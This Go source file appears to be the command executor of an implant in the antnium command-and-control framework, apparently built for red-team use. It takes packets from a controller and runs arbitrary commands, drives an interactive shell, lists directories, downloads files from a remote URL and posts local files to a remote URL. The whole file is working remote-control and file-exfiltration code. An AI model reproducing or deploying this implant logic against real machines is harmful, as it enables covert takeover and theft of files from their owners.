package executor

import (
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"

	"github.com/dobin/antnium/pkg/arch"
	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
)

type Executor struct {
	interactiveShell InteractiveShell
}

func MakeExecutor() Executor {
	interactiveShell := makeInteractiveShell()
	executor := Executor{
		interactiveShell,
	}
	return executor
}

// Execute will execute the packet according to its PacketType
// and return the packet with packet.Response set containing the details of the execution
// and error when something went wrong
func (p *Executor) Execute(packet model.Packet) (model.Packet, error) {
	var err error

	log.WithFields(log.Fields{
		"1_computerId":   packet.ComputerId,
		"2_packetId":     packet.PacketId,
		"3_downstreamId": packet.DownstreamId,
		"4_packetType":   packet.PacketType,
		"5_arguments":    packet.Arguments,
	}).Info("Exec")

	if packet.PacketType == "ping" {
		packet.Response, err = p.actionPing(packet.Arguments)
	} else if packet.PacketType == "test" {
		packet.Response, err = p.actionTest(packet.Arguments)
	} else if packet.PacketType == "shutdown" {
		packet.Response, err = p.actionShutdown(packet.Arguments)
	} else if packet.PacketType == "exec" {
		packet.Response, err = p.actionExec(packet.Arguments)
	} else if packet.PacketType == "fileupload" {
		packet.Response, err = p.actionFileupload(packet.Arguments)
	} else if packet.PacketType == "filedownload" {
		packet.Response, err = p.actionFiledownload(packet.Arguments)
	} else if packet.PacketType == "iOpen" {
		packet.Response, err = p.actionInteractiveShellOpen(packet.Arguments)
	} else if packet.PacketType == "iIssue" {
		packet.Response, err = p.actionInteractiveShellIssue(packet.Arguments)
	} else if packet.PacketType == "iClose" {
		packet.Response, err = p.actionInteractiveShellClose(packet.Arguments)
	} else if packet.PacketType == "dir" {
		packet.Response, err = p.actionDir(packet.Arguments)
	} else {
		packet.Response = make(model.PacketResponse)
		packet.Response["err"] = "packet type not known: " + packet.PacketType
	}

	// Add any errors to the packet response
	if err != nil {
		packet.Response["error"] = err.Error()
		return packet, err
	}

	return packet, nil
}

func (p *Executor) actionInteractiveShellOpen(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	_, force := packetArgument["force"]

	executable, args, err := model.MakePacketArgumentFrom(packetArgument)
	if err != nil {
		return ret, err
	}

	if p.interactiveShell.AlreadyOpen() && !force {
		return ret, fmt.Errorf("already_open")
	} else {
		if p.interactiveShell.AlreadyOpen() {
			p.interactiveShell.execCmd.Process.Kill()
		}
		stdout, stderr, err := p.interactiveShell.open(executable, args)
		if err != nil {
			return ret, err
		}

		ret["stdout"] = stdout
		ret["stderr"] = stderr
		return ret, nil
	}
}

func (p *Executor) actionInteractiveShellIssue(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	// Check and transform input
	commandline, ok := packetArgument["commandline"]
	if !ok {
		return ret, fmt.Errorf("No argument 'commandline' given")
	}

	stdout, stderr, err := p.interactiveShell.issue(commandline)
	if err != nil {
		return ret, err
	}
	ret["stdout"] = stdout
	ret["stderr"] = stderr

	return ret, nil
}

func (p *Executor) actionShutdown(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	os.Exit(0)
	return nil, nil // Never reached
}

func (p *Executor) actionInteractiveShellClose(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	err := p.interactiveShell.close()
	if err != nil {
		ret["err"] = err.Error()
		ret["stdout"] = "closed"
	} else {
		ret["status"] = "no error"
		ret["stdout"] = "closed"
	}

	return ret, nil
}

func (p *Executor) actionPing(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	ret["response"] = "ping answer"
	return ret, nil
}

func (p *Executor) actionTest(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	ret["response"] = "test answer"
	return ret, nil
}

func (p *Executor) actionExec(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	// Check and transform input done in there sadly
	stdout, stderr, pid, exitCode, err := MyExec(packetArgument)

	ret["stdout"] = arch.WindowsToString(stdout)
	ret["stderr"] = arch.WindowsToString(stderr)
	ret["pid"] = strconv.Itoa(pid)
	ret["exitCode"] = strconv.Itoa(exitCode)

	return ret, err
}

func (p *Executor) actionFiledownload(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	// Check and transform input
	remoteurl, ok := packetArgument["remoteurl"]
	if !ok {
		return ret, fmt.Errorf("No argument 'remoteUrl' given")
	}
	destination, ok := packetArgument["destination"]
	if !ok {
		return ret, fmt.Errorf("No argument 'destination' given")
	}
	if _, err := os.Stat(destination); !errors.Is(err, fs.ErrNotExist) {
		return ret, fmt.Errorf("Destination %s already exists", destination)
	}

	// Download and write file
	resp, err := http.Get(remoteurl)
	if err != nil {
		return ret, err
	}
	defer resp.Body.Close()

	out, err := os.Create(destination)
	if err != nil {
		return ret, err
	}
	defer out.Close()
	written, err := io.Copy(out, resp.Body)
	if err != nil {
		return ret, err
	}

	ret["response"] = fmt.Sprintf("Written %d bytes", written)
	return ret, nil
}

func (p *Executor) actionFileupload(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	// Check and transform input
	remoteurl, ok := packetArgument["remoteurl"]
	if !ok {
		return ret, fmt.Errorf("No argument 'remoteurl' given")
	}
	source, ok := packetArgument["source"]
	if !ok {
		return ret, fmt.Errorf("No argument 'source' given")
	}
	if _, err := os.Stat(source); errors.Is(err, fs.ErrNotExist) {
		return ret, fmt.Errorf("file %s does not exists", source)
	}

	client := &http.Client{}
	data, err := os.Open(source)
	if err != nil {
		return ret, err
	}
	req, err := http.NewRequest("POST", remoteurl, data)
	if err != nil {
		return ret, err
	}
	resp, err := client.Do(req)
	if err != nil {
		return ret, err
	}
	_, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return ret, err
	}

	ret["response"] = fmt.Sprintf("Status: %s", resp.Status)
	return ret, nil
}

func (p *Executor) actionDir(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	// Check and transform input
	path, ok := packetArgument["path"]
	if !ok {
		return ret, fmt.Errorf("No argument 'path' given")
	}

	dirList, err := model.ListDirectory(path)
	if err != nil {
		return ret, err
	}
	json, err := json.Marshal(dirList)
	if err != nil {
		return ret, err
	}

	ret["filelist"] = string(json)

	return ret, nil
}
